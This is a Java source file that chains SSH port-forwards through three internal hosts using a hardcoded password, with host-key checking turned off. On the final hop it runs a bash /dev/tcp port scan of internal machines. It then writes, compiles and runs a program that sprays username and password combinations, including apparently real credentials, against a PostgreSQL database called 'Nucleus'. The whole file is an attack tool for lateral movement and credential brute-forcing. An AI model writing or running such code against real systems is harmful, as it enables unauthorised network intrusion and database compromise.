import com.jcraft.jsch.*;
import java.io.*;
class XSL {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    int fwd2 = s2.setPortForwardingL(0, "10.13.16.196", 22);
    Session s3 = j.getSession("user", "127.0.0.1", fwd2);
    s3.setPassword("kutul0nc4t");
    s3.setConfig(p);
    s3.setTimeout(8000);
    s3.connect();
    ChannelExec ch = (ChannelExec) s3.openChannel("exec");
    // From NEO, try Nucleus ports and also try to find Nucleus DB
    ch.setCommand("echo ---NUCLEUS-PORTS---;for p in 22 80 443 8080 8443 8216 9090; do timeout 1 bash -c \"echo > /dev/tcp/10.13.16.135/$p\" 2>/dev/null && echo 10.13.16.135:$p-OPEN; done;echo ---NUCLEUS-DB-PORT---;for p in 5432 5501 3306; do timeout 1 bash -c \"echo > /dev/tcp/10.13.17.248/$p\" 2>/dev/null && echo 10.13.17.248:$p-OPEN; done;echo ---TRY-NUCLEUS-DB---;cd /tmp;echo 'import java.sql.*;class ND{public static void main(String[] a)throws Exception{Class.forName(\"org.postgresql.Driver\");String[] dbs={\"nucleus\",\"accurate\"};String[] users={\"nucleus\",\"accurate\",\"noxify\",\"neo\"};String[] passes={\"cZskyJqqE7?7V_8=#Ed^\",\"BJwx+sAC6jreaV45\",\"kutul0nc4t\"};for(String db:dbs)for(String u:users)for(String pw:passes){try{Connection c=DriverManager.getConnection(\"jdbc:postgresql://10.13.17.248:5432/\"+db,u,pw);System.out.println(\"OK \"+db+\":\"+u+\":\"+pw);c.close();return;}catch(Exception e){}}System.out.println(\"ALL_FAIL\");}}' > ND.java;/usr/lib/jvm/java-1.8.0-amazon-corretto/bin/javac -cp /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/lib/postgresql-42.3.3.jar ND.java 2>&1;/usr/lib/jvm/java-1.8.0-amazon-corretto/bin/java -cp /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/lib/postgresql-42.3.3.jar:. ND 2>&1");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s3.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
